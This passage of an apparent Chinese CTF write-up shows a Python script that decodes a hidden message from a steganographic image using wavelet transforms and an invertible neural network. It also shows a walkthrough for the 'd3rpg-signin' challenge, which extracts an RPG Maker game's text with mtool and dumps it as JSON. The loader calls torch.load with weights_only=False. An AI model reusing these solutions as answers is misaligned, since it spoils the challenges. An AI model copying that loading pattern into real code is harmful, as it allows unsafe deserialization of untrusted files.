class="number">128</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DWT</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(DWT, <span class="variable language_">self</span>).__init__()</span><br><span class="line">        <span class="variable language_">self</span>.requires_grad = <span class="literal">False</span>  <span class="comment"># Fixed transform</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x01 = x[:, :, <span class="number">0</span>::<span class="number">2</span>, :] / <span class="number">2</span></span><br><span class="line">        x02 = x[:, :, <span class="number">1</span>::<span class="number">2</span>, :] / <span class="number">2</span></span><br><span class="line">        x1 = x01[:, :, :, <span class="number">0</span>::<span class="number">2</span>]</span><br><span class="line">        x2 = x02[:, :, :, <span class="number">0</span>::<span class="number">2</span>]</span><br><span class="line">        x3 = x01[:, :, :, <span class="number">1</span>::<span class="number">2</span>]</span><br><span class="line">        x4 = x02[:, :, :, <span class="number">1</span>::<span class="number">2</span>]</span><br><span class="line">        x_LL = x1 + x2 + x3 + x4</span><br><span class="line">        x_HL = -x1 - x2 + x3 + x4</span><br><span class="line">        x_LH = -x1 + x2 - x3 + x4</span><br><span class="line">        x_HH = x1 - x2 - x3 + x4</span><br><span class="line">        <span class="keyword">return</span> torch.cat((x_LL, x_HL, x_LH, x_HH), <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IWT</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(IWT, <span class="variable language_">self</span>).__init__()</span><br><span class="line">        <span class="variable language_">self</span>.requires_grad = <span class="literal">False</span>  <span class="comment"># Fixed transform</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        r = <span class="number">2</span></span><br><span class="line">        in_batch, in_channel, in_height, in_width = x.size()</span><br><span class="line">        out_batch, out_channel, out_height, out_width = in_batch, <span class="built_in">int</span>(</span><br><span class="line">            in_channel / (r ** <span class="number">2</span>)), r * in_height, r * in_width</span><br><span class="line">        x1 = x[:, <span class="number">0</span>:out_channel, :, :] / <span class="number">2</span></span><br><span class="line">        x2 = x[:, out_channel:out_channel * <span class="number">2</span>, :, :] / <span class="number">2</span></span><br><span class="line">        x3 = x[:, out_channel * <span class="number">2</span>:out_channel * <span class="number">3</span>, :, :] / <span class="number">2</span></span><br><span class="line">        x4 = x[:, out_channel * <span class="number">3</span>:out_channel * <span class="number">4</span>, :, :] / <span class="number">2</span></span><br><span class="line">        h = torch.zeros([out_batch, out_channel, out_height, out_width], device=x.device).<span class="built_in">float</span>()</span><br><span class="line">        h[:, :, <span class="number">0</span>::<span class="number">2</span>, <span class="number">0</span>::<span class="number">2</span>] = x1 - x2 - x3 + x4</span><br><span class="line">        h[:, :, <span class="number">1</span>::<span class="number">2</span>, <span class="number">0</span>::<span class="number">2</span>] = x1 - x2 + x3 - x4</span><br><span class="line">        h[:, :, <span class="number">0</span>::<span class="number">2</span>, <span class="number">1</span>::<span class="number">2</span>] = x1 + x2 - x3 - x4</span><br><span class="line">        h[:, :, <span class="number">1</span>::<span class="number">2</span>, <span class="number">1</span>::<span class="number">2</span>] = x1 + x2 + x3 + x4</span><br><span class="line">        <span class="keyword">return</span> h</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">auxiliary_variable</span>(<span class="params">shape, device</span>):</span><br><span class="line">    <span class="keyword">return</span> torch.randn(shape, device=device)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bits_to_bytearray</span>(<span class="params">bits</span>):</span><br><span class="line">    ints = []</span><br><span class="line">    bits_list = np.array(bits).astype(<span class="built_in">int</span>).tolist()  <span class="comment"># Ensure list of ints</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(bits_list) // <span class="number">8</span>):</span><br><span class="line">        byte_bits = bits_list[b * <span class="number">8</span>:(b + <span class="number">1</span>) * <span class="number">8</span>]</span><br><span class="line">        ints.append(<span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(bit) <span class="keyword">for</span> bit <span class="keyword">in</span> byte_bits]), <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytearray</span>(ints)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bytearray_to_text</span>(<span class="params">x_bytearray</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        decoded_data_tuple = rs.decode(x_bytearray)</span><br><span class="line">        data_to_decompress = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(decoded_data_tuple, <span class="built_in">tuple</span>) <span class="keyword">or</span> <span class="built_in">isinstance</span>(decoded_data_tuple, <span class="built_in">list</span>):</span><br><span class="line">            <span class="keyword">if</span> decoded_data_tuple:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(decoded_data_tuple[<span class="number">0</span>], <span class="built_in">list</span>) <span class="keyword">and</span> <span class="built_in">len</span>(decoded_data_tuple[<span class="number">0</span>]) &gt; <span class="number">0</span>:</span><br><span class="line">                    data_to_decompress = decoded_data_tuple[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    data_to_decompress = decoded_data_tuple[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data_to_decompress = decoded_data_tuple</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> data_to_decompress <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span>  <span class="comment"># Reed-Solomon decoding might result in no data</span></span><br><span class="line"></span><br><span class="line">        decompressed_text_bytes = zlib.decompress(data_to_decompress)</span><br><span class="line">        <span class="keyword">return</span> decompressed_text_bytes.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:  <span class="comment"># Catch all errors during RS decoding or zlib decompression</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- Script Helper Functions ---</span></span><br><span class="line">transform_stego = T.Compose([</span><br><span class="line">    T.CenterCrop((<span class="number">720</span>, <span class="number">1280</span>)),  <span class="comment"># Assumes stego image is at least this size or exactly this size</span></span><br><span class="line">    T.ToTensor(),</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_model_weights</span>(<span class="params">model_wrapper_instance, weight_file_path</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Attempting to load weights from: <span class="subst">&#123;weight_file_path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Explicitly set weights_only=False for compatibility if file has pickled classes,</span></span><br><span class="line">        <span class="comment"># though True is safer if it&#x27;s guaranteed to be only tensors.</span></span><br><span class="line">        full_state_dict_from_file = torch.load(weight_file_path, map_location=<span class="keyword">lambda</span> storage, loc: storage,</span><br><span class="line">                                               weights_only=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Extract the relevant state dictionary (likely under &#x27;net&#x27; key from original Model save)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;net&#x27;</span> <span class="keyword">in</span> full_state_dict_from_file:</span><br><span class="line">            params_from_file = full_state_dict_from_file[<span class="string">&#x27;net&#x27;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            params_from_file = full_state_dict_from_file  <span class="comment"># Fallback if no &#x27;net&#x27; key</span></span><br><span class="line"></span><br><span class="line">        transformed_state_dict = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> k_orig, v_param <span class="keyword">in</span> params_from_file.items():</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;tmp_var&#x27;</span> <span class="keyword">in</span> k_orig:  <span class="comment"># Skip temporary variables if any</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            new_k = k_orig  <span class="comment"># Default to original key</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># Transform keys from &quot;model.invX...&quot; to &quot;inv_blocks.(X-1)...&quot;</span></span><br><span class="line">            <span class="keyword">if</span> k_orig.startswith(<span class="string">&quot;model.&quot;</span>):</span><br><span class="line">                key_after_model_prefix = k_orig[<span class="built_in">len</span>(<span class="string">&quot;model.&quot;</span>):]</span><br><span class="line">                <span class="keyword">match</span> = re.<span class="keyword">match</span>(<span class="string">r&quot;inv(\d+)\.(.*)&quot;</span>, key_after_model_prefix)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                    inv_idx = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>)) - <span class="number">1</span></span><br><span class="line">                    rest_of_key = <span class="keyword">match</span>.group(<span class="number">2</span>)</span><br><span class="line">                    new_k = <span class="string">f&quot;inv_blocks.<span class="subst">&#123;inv_idx&#125;</span>.<span class="subst">&#123;rest_of_key&#125;</span>&quot;</span></span><br><span class="line">            <span class="comment"># Transform keys from &quot;invX...&quot; (if no &quot;model.&quot; prefix was present)</span></span><br><span class="line">            <span class="keyword">elif</span> k_orig.startswith(<span class="string">&quot;inv&quot;</span>):</span><br><span class="line">                <span class="keyword">match</span> = re.<span class="keyword">match</span>(<span class="string">r&quot;inv(\d+)\.(.*)&quot;</span>, k_orig)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                    inv_idx = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>)) - <span class="number">1</span></span><br><span class="line">                    rest_of_key = <span class="keyword">match</span>.group(<span class="number">2</span>)</span><br><span class="line">                    new_k = <span class="string">f&quot;inv_blocks.<span class="subst">&#123;inv_idx&#125;</span>.<span class="subst">&#123;rest_of_key&#125;</span>&quot;</span></span><br><span class="line">            <span class="comment"># If transformation occurred, new_k will be different. Otherwise, it&#x27;s k_orig.</span></span><br><span class="line">            <span class="comment"># Print a warning if a key was expected to be transformed but wasn&#x27;t,</span></span><br><span class="line">            <span class="comment"># or if an unexpected key structure is encountered.</span></span><br><span class="line">            <span class="keyword">if</span> new_k == k_orig <span class="keyword">and</span> (k_orig.startswith(<span class="string">&quot;model.inv&quot;</span>) <span class="keyword">or</span> k_orig.startswith(<span class="string">&quot;inv&quot;</span>)):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Warning: Key &#x27;<span class="subst">&#123;k_orig&#125;</span>&#x27; was not transformed as expected. Check patterns.&quot;</span>)</span><br><span class="line"></span><br><span class="line">            transformed_state_dict[new_k] = v_param</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Load into the D3net instance (model_wrapper_instance.model)</span></span><br><span class="line">        model_wrapper_instance.model.load_state_dict(transformed_state_dict)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Weights loaded successfully into D3net model.&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error: Weight file &#x27;<span class="subst">&#123;weight_file_path&#125;</span>&#x27; not found.&quot;</span>)</span><br><span class="line">        <span class="keyword">raise</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error loading or processing weights from &#x27;<span class="subst">&#123;weight_file_path&#125;</span>&#x27;: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stego_transform2tensor</span>(<span class="params">img_path, current_device</span>):</span><br><span class="line">    img = Image.<span class="built_in">open</span>(img_path).convert(<span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line">    transformed_img = transform_stego(img)</span><br><span class="line">    <span class="keyword">return</span> transformed_img.unsqueeze(<span class="number">0</span>).to(current_device)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- Main Decryption Logic ---</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_message</span>(<span class="params">stego_image_path, weight_file</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Initializing...&quot;</span>)</span><br><span class="line">    current_device = torch.device(<span class="string">&quot;cuda:0&quot;</span> <span class="keyword">if</span> torch.cuda.is_available() <span class="keyword">else</span> <span class="string">&quot;cpu&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Using device: <span class="subst">&#123;current_device&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Initialize the Model which wraps D3net</span></span><br><span class="line">    d3net_wrapper = Model(use_cuda=torch.cuda.is_available())</span><br><span class="line"></span><br><span class="line">    dwt = DWT().to(current_device)</span><br><span class="line">    iwt = IWT().to(current_device)</span><br><span class="line"></span><br><span class="line">    load_model_weights(d3net_wrapper, weight_file)</span><br><span class="line">    d3net_wrapper.<span class="built_in">eval</span>()  <span class="comment"># Set to evaluation mode</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Loading steganographic image: <span class="subst">&#123;stego_image_path&#125;</span>&quot;</span>)</span><br><span class="line">    stego_tensor = stego_transform2tensor(stego_image_path, current_device)</span><br><span class="line"></span><br><span class="line">    B, C_stego, H_stego, W_stego = stego_tensor.size()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Applying DWT to stego image...&quot;</span>)</span><br><span class="line">    Y1_observed_dwt = dwt(stego_tensor)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Generating auxiliary variable...&quot;</span>)</span><br><span class="line">    Y2_for_inverse_dwt_shape = Y1_observed_dwt.shape</span><br><span class="line">    Y2_for_inverse_dwt = auxiliary_variable(Y2_for_inverse_dwt_shape, current_device)</span><br><span class="line"></span><br><span class="line">    Y_input_for_inverse = torch.cat((Y1_observed_dwt, Y2_for_inverse_dwt), dim=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Applying inverse D3Net model...&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():  <span class="comment"># Inference mode</span></span><br><span class="line">        X_reconstructed_dwt = d3net_wrapper(Y_input_for_inverse, rev=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Extract the payload part from the reconstructed DWT tensor</span></span><br><span class="line">    num_channels_per_dwt_stream = Y1_observed_dwt.shape[<span class="number">1</span>]  <span class="comment"># Should be 12 for a 3-channel original image</span></span><br><span class="line">    reconstructed_payload_dwt = X_reconstructed_dwt.narrow(<span class="number">1</span>, num_channels_per_dwt_stream, num_channels_per_dwt_stream)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Applying IWT to reconstructed payload DWT...&quot;</span>)</span><br><span class="line">    recovered_payload_spatial = iwt(reconstructed_payload_dwt)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Binarizing recovered payload...&quot;</span>)</span><br><span class="line">    recovered_bits_flat = (recovered_payload_spatial.contiguous().view(-<span class="number">1</span>) &gt; <span class="number">0.5</span>).<span class="built_in">float</span>()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Converting bits to text...&quot;</span>)</span><br><span class="line">    candidates = Counter()</span><br><span class="line">    bits_list = recovered_bits_flat.data.<span class="built_in">int</span>().cpu().numpy().tolist()</span><br><span class="line"></span><br><span class="line">    terminator = <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">32</span> // <span class="number">8</span>)  <span class="comment"># 4 null bytes, matching 32 zero bits in make_payload</span></span><br><span class="line">    byte_array_data = bits_to_bytearray(bits_list)</span><br><span class="line"></span><br><span class="line">    potential_message_parts = []</span><br><span class="line">    current_part_start_index = <span class="number">0</span></span><br><span class="line">    search_from_index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> search_from_index &lt; <span class="built_in">len</span>(byte_array_data):</span><br><span class="line">        terminator_found_at = -<span class="number">1</span></span><br><span class="line">        <span class="keyword">try</span>:  <span class="comment"># bytearray.find is efficient</span></span><br><span class="line">            terminator_found_at = byte_array_data.find(terminator, search_from_index)</span><br><span class="line">        <span class="keyword">except</span> TypeError:  <span class="comment"># Fallback for some Python versions if .find with bytes fails</span></span><br><span class="line">            idx = search_from_index</span><br><span class="line">            <span class="keyword">while</span> idx &lt;= <span class="built_in">len</span>(byte_array_data) - <span class="built_in">len</span>(terminator):</span><br><span class="line">                <span class="keyword">if</span> byte_array_data[idx: idx + <span class="built_in">len</span>(terminator)] == terminator:</span><br><span class="line">                    terminator_found_at = idx</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                idx += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> terminator_found_at != -<span class="number">1</span>:</span><br><span class="line">            part = byte_array_data[current_part_start_index: terminator_found_at]</span><br><span class="line">            <span class="keyword">if</span> part: potential_message_parts.append(part)</span><br><span class="line">            current_part_start_index = terminator_found_at + <span class="built_in">len</span>(terminator)</span><br><span class="line">            search_from_index = current_part_start_index</span><br><span class="line">        <span class="keyword">else</span>:  <span class="comment"># No more terminators</span></span><br><span class="line">            part = byte_array_data[current_part_start_index:]</span><br><span class="line">            <span class="keyword">if</span> part: potential_message_parts.append(part)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> potential_message_parts <span class="keyword">and</span> <span class="built_in">len</span>(byte_array_data) &gt; <span class="number">0</span>:  <span class="comment"># Handle case with no terminators but data exists</span></span><br><span class="line">        potential_message_parts.append(byte_array_data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> candidate_bytes <span class="keyword">in</span> potential_message_parts:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> candidate_bytes: <span class="keyword">continue</span>  <span class="comment"># Skip empty byte arrays</span></span><br><span class="line">        candidate_text = bytearray_to_text(candidate_bytes)</span><br><span class="line">        <span class="keyword">if</span> candidate_text:  <span class="comment"># bytearray_to_text returns False on error</span></span><br><span class="line">            candidates[candidate_text] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> candidates:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nFailed to find any candidate message after decoding.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    most_common_candidate, count = candidates.most_common(<span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n--- Recovered Message (most common, appeared <span class="subst">&#123;count&#125;</span> times) ---&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(most_common_candidate)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;--- End of Message ---&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> most_common_candidate</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    stego_image_file = <span class="string">&#x27;mysterious_invitation.png&#x27;</span></span><br><span class="line">    model_weights_file = <span class="string">&#x27;magic.potions&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(stego_image_file):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error: Stego image &#x27;<span class="subst">&#123;stego_image_file&#125;</span>&#x27; not found. Please place it in the current directory.&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> os.path.exists(model_weights_file):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error: Model weights file &#x27;<span class="subst">&#123;model_weights_file&#125;</span>&#x27; not found. Please place it in the current directory.&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        decrypt_message(stego_image_file, model_weights_file)</span><br></pre></td></tr></table></figure>

<p><img src="./6b1b6194-2bb6-4974-aff8-c3c32e2b7621.png" alt="img"></p>
<h2><span id="d3rpg-signin"><strong>d3rpg-signin</strong></span><a href="#d3rpg-signin" class="header-anchor"></a></h2><p>通过任务管理器可得其为RPG Maker系列游戏</p>
<p><img src="./43256972-53ec-4852-b96c-6d24fd903796.png" alt="img"></p>
<p>常玩这一类的玩家可以知道可以使用mtool进行游戏内容的获取和修改</p>
<p><img src="./1c965027-ebf4-429c-9963-c8776e06d09f.png" alt="img"></p>
<p>通过游玩发现flag以文本的形式出现</p>
<p><img src="./20fb8846-cdab-4bcf-bd49-03da669a2f1c.png" alt="img"></p>
<p><img src="./49800658-50e4-466d-b5ba-92af553f63c5.png" alt="img"></p>
<p>因而可以使用mtool的翻译功能获取所有的文本</p>
<p><img src="./9eaf1d54-ae84-441c-b164-1081c0b248e4.png" alt="img"></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    前序省略</span><br><span class="line">    <span class="attr">&quot;*The Musc meme comes from a person&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*The Musc meme comes from a person&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;*but boring. People combined his&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*but boring. People combined his&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Thank you for your hard work,&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Thank you for your hard work,&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;You firmly remember the flag he&quot;</span><span class="punctuation">:</span> <span class="string">&quot;You firmly remember the flag he&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;I won&#x27;t give you any clues,&quot;</span><span class="punctuation">:</span> <span class="string">&quot;I won&#x27;t give you any clues,&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;System&quot;</span><span class="punctuation">:</span> <span class="string">&quot;System&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Flag Correct! The world&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Flag Correct! The world&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Malicious code&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Malicious code&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Please hurry up, the malicious&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Please hurry up, the malicious&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;你拨开灰烬，发现一块烧焦的木片，上&quot;</span><span class="punctuation">:</span> <span class="string">&quot;你拨开灰烬，发现一块烧焦的木片，上&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;You push aside the ashes and find&quot;</span><span class="punctuation">:</span> <span class="string">&quot;You push aside the ashes and find&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;\&quot;LOG&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\&quot;LOG&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Core temperature&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Core temperature&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;请选择语言&quot;</span><span class="punctuation">:</span> <span class="string">&quot;请选择语言&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Select Language&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Select Language&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;简体中文&quot;</span><span class="punctuation">:</span> <span class="string">&quot;简体中文&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;English&quot;</span><span class="punctuation">:</span> <span class="string">&quot;English&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;TIP&quot;</span><span class="punctuation">:</span> <span class="string">&quot;TIP&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;The English version is&quot;</span><span class="punctuation">:</span> <span class="string">&quot;The English version is&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;欢迎来到D3RPG，一个游戏世界名为&quot;</span><span class="punctuation">:</span> <span class="string">&quot;欢迎来到D3RPG，一个游戏世界名为&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;传说中，创世神「D3」的源代码被&quot;</span><span class="punctuation">:</span> <span class="string">&quot;传说中，创世神「D3」的源代码被&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;玩家扮演一名闯入这个世界的黑&quot;</span><span class="punctuation">:</span> <span class="string">&quot;玩家扮演一名闯入这个世界的黑&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Welcome to D3RPG, a game world&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Welcome to D3RPG, a game world&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;According to legend, the source code&quot;</span><span class="punctuation">:</span> <span class="string">&quot;According to legend, the source code&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;The player plays a hacker who breaks&quot;</span><span class="punctuation">:</span> <span class="string">&quot;The player plays a hacker who breaks&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;宝箱：我只是一个贴图！！！&quot;</span><span class="punctuation">:</span> <span class="string">&quot;宝箱：我只是一个贴图！！！&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Treasure Chest&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Treasure Chest&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;5a303760342c3733313234262121256421&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5a303760342c3733313234262121256421&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;I&#x27;m just a sticker!!!&quot;</span><span class="punctuation">:</span> <span class="string">&quot;I&#x27;m just a sticker!!!&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;宝箱中的纸条：&quot;</span><span class="punctuation">:</span> <span class="string">&quot;宝箱中的纸条：&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Note in the treasure chest&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Note in the treasure chest&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;宝箱中的纸条：密码 ≠ 密钥，&quot;</span><span class="punctuation">:</span> <span class="string">&quot;宝箱中的纸条：密码 ≠ 密钥，&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;村长&quot;</span><span class="punctuation">:</span> <span class="string">&quot;村长&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;你好，我是村长&quot;</span><span class="punctuation">:</span> <span class="string">&quot;你好，我是村长&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;太好了是村长我们有救了&quot;</span><span class="punctuation">:</span> <span class="string">&quot;太好了是村长我们有救了&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;我知道你很想现在就拿到flag，但是&quot;</span><span class="punctuation">:</span> <span class="string">&quot;我知道你很想现在就拿到flag，但是&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Hint：&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Hint：&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Village Chief&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Village 